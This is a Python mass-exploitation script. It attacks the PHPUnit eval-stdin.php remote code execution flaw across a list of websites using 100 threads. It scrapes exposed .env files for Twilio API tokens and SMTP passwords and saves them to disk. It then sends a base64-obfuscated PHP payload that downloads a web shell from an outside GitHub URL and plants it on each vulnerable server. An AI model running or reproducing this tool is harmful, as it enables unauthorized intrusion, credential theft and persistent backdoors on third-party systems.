# -*- coding: utf-8 -*-

banner = """
  _                           _____   _    
 | |    _ __ ___   __ _ _ __ |___ /  / \   
 | |   | '_ ` _ \ / _` | '_ \  |_ \ / _ \  
 | |___| | | | | | (_| | | | |___) / ___ \ 
 |_____|_| |_| |_|\__,_|_| |_|____/_/   \_\
                        Last Version
                      By Capitos Kamal
                  Telegram : @Capitos_Kamal                      
"""
import requests, re, sys, threading
from  time import sleep
from urlparse import urlparse
requests.packages.urllib3.disable_warnings()
import threading, time, random
from Queue import Queue
from threading import *
screenlock = Semaphore(value=1)
""" 
  _                           _____   _    
 | |    _ __ ___   __ _ _ __ |___ /  / \   
 | |   | '_ ` _ \ / _` | '_ \  |_ \ / _ \  
 | |___| | | | | | (_| | | | |___) / ___ \ 
 |_____|_| |_| |_|\__,_|_| |_|____/_/   \_\
 
"""
vuln = 0
bad = 0
shel = 0
smtp = 0
api_twillio = 0

""" 
  _                           _____   _    
 | |    _ __ ___   __ _ _ __ |___ /  / \   
 | |   | '_ ` _ \ / _` | '_ \  |_ \ / _ \  
 | |___| | | | | | (_| | | | |___) / ___ \ 
 |_____|_| |_| |_|\__,_|_| |_|____/_/   \_\
 
"""
def get_twillio(url):
	global api_twillio
	fin = url.replace("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/.env")
        try:
                spawn = requests.get(fin, timeout=15, verify=False).text
                if "TWILIO" in spawn:
                        acc_sid = re.findall("\nTWILIO_ACCOUNT_SID=(.*?)\n", spawn)[0]
                        token = re.findall("\nTWILIO_AUTH_TOKEN=(.*?)\n", spawn)[0]
                        phone = re.findall("\nTWILIO_PHONE=(.*?)\n", spawn)[0]
                        sid = re.findall("\nTWILIO_SID=(.*?)\n", spawn)[0]
                        screenlock.acquire()
                        print("\033[44m TWILIO \033[0m "+fin)
                        api_twillio = api_twillio + 1
                        file = open("twil)io.txt","a")
                        geturl = fin
                        pack = geturl+"|"+acc_sid+"|"+token+"|"+phone+"|"+sid
                        file.write(pack+"\n")
                        file.close()
                        screenlock.release()
        except KeyboardInterrupt:
                print("Closed")
                exit()
        except:
                pass
""" 
  _                           _____   _    
 | |    _ __ ___   __ _ _ __ |___ /  / \   
 | |   | '_ ` _ \ / _` | '_ \  |_ \ / _ \  
 | |___| | | | | | (_| | | | |___) / ___ \ 
 |_____|_| |_| |_|\__,_|_| |_|____/_/   \_\
 
"""
def get_smtp(url):
        global smtp
        fin = url.replace("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/.env")
        try:
                spawn = requests.get(fin, timeout=15, verify=False).text
                if "MAIL_HOST" in spawn and "MAIL_USERNAME" in spawn:
                        host = re.findall("\nMAIL_HOST=(.*?)\n", spawn)[0]
                        port = re.findall("\nMAIL_PORT=(.*?)\n", spawn)[0]
                        user = re.findall("\nMAIL_USERNAME=(.*?)\n", spawn)[0]
                        pasw = re.findall("\nMAIL_PASSWORD=(.*?)\n", spawn)[0]
                        if user == "null" or pasw == "null" or user == "" or pasw == "":
                                pass
                        if "mailtrap" in user:
                                pass
                        else:
                                screenlock.acquire()
                                print("\033[44m SMTP \033[0m "+fin)
                                smtp = smtp + 1
                                file = open("smtp.txt","a")
                                geturl = fin.replace(".env","")
                                pack = geturl+"|"+host+"|"+port+"|"+user+"|"+pasw
                                file.write(pack+"\n")
                                file.close()
                                screenlock.release()
        except KeyboardInterrupt:
                print("Closed")
                exit()
        except:
                pass
""" 
  _                           _____   _    
 | |    _ __ ___   __ _ _ __ |___ /  / \   
 | |   | '_ ` _ \ / _` | '_ \  |_ \ / _ \  
 | |___| | | | | | (_| | | | |___) / ___ \ 
 |_____|_| |_| |_|\__,_|_| |_|____/_/   \_\
 
"""
def exploit(url):
        get_smtp(url)
        get_twillio(url)
        global vuln
        global bad
        global shel
        try:
                data = "<?php phpinfo(); ?>"
                text = requests.get(url, data=data, timeout=15, verify=False)
                if "phpinfo" in text.text:
                        screenlock.acquire()
                        print("\033[42;1m VULN \033[0m "+url)
                        screenlock.release()
                        vuln = vuln + 1
                        wre = open("vulnerable.txt", "a")
                        wre.write(url+"\n")
                        wre.close()
                        data2 = "<?php eval('?>'.base64_decode('PD9waHANCmZ1bmN0aW9uIGFkbWluZXIoJHVybCwgJGlzaSkgew0KCSRmcCA9IGZvcGVuKCRpc2ksICJ3Iik7DQoJJGNoID0gY3VybF9pbml0KCk7DQoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybCk7DQoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0JJTkFSWVRSQU5TRkVSLCB0cnVlKTsNCgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwgZmFsc2UpOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GSUxFLCAkZnApOw0KCXJldHVybiBjdXJsX2V4ZWMoJGNoKTsNCgljdXJsX2Nsb3NlKCRjaCk7DQoJZmNsb3NlKCRmcCk7DQoJb2JfZmx1c2goKTsNCglmbHVzaCgpOw0KfQ0KaWYoYWRtaW5lcigiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3h5b3Vlei9MaW51eFNlYy9tYXN0ZXIvYmF5LnBocCIsInNoM2xsLnBocCIpKSB7DQoJZWNobyAiU3Vrc2VzIjsNCn0gZWxzZSB7DQoJZWNobyAiZmFpbCI7DQp9DQo/Pg==')); ?>"
                        spawn = requests.get(url, data=data2, timeout=15, verify=False)
                        if "Sukses" in spawn.text:
                                screenlock.acquire()
                                print("     \033[42;1m | \033[0m Shell Finder")
                                screenlock.release()
                                shel = shel + 1
                                wrs = open("shells.txt", "a")
                                pathshell = url.replace("eval-stdin.php","sh3ll.php")
                                wrs.write(pathshell+"\n")
                                wrs.close()
                        else:
                                screenlock.acquire()
                                print("     \033[41;1m | \033[0m Fail Finder Shell")
                                screenlock.release()
                else:
                        screenlock.acquire()
                        print("\033[41;1m BAAD \033[0m "+url)
                        screenlock.release()
                        bad = bad + 1
        except KeyboardInterrupt:
                print("Closed")
                exit()
        except Exception as err:
                screenlock.acquire()
                print("\033[43;1m ERROR \033[0m "+url)
                screenlock.release()
                bad = bad + 1
try:
        list = sys.argv[1]
except:
        print "\033[31;1m"+banner+"\033[0m"
        print("\n\n# python run.py list.txt")
        exit()
asu = open(list).read().splitlines()
jobs = Queue()
def do_stuff(q):
        while not q.empty():
                i = q.get()
                exp = "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
                if i.startswith("http"):
                        url = i+exp
                        exploit(url)
                else:
                        url = "http://"+i+exp
                        exploit(url)
                q.task_done()

for trgt in asu:
        jobs.put(trgt)

for i in range(100): # Default 10 Thread Ganti Aja Kalau Mau
        worker = threading.Thread(target=do_stuff, args=(jobs,))
        worker.start()
jobs.join()
print("\033[44mSMTP            : \033[0m "+str(smtp))
print("\033[44mTWILIO           : \033[0m "+str(api_twillio))
print("\033[42;1mFinder Shell : \033[0m "+str(shel))
print("\033[43;1mExploited       : \033[0m "+str(vuln))
print("\033[41;1mNot Vuln : \033[0m "+str(bad))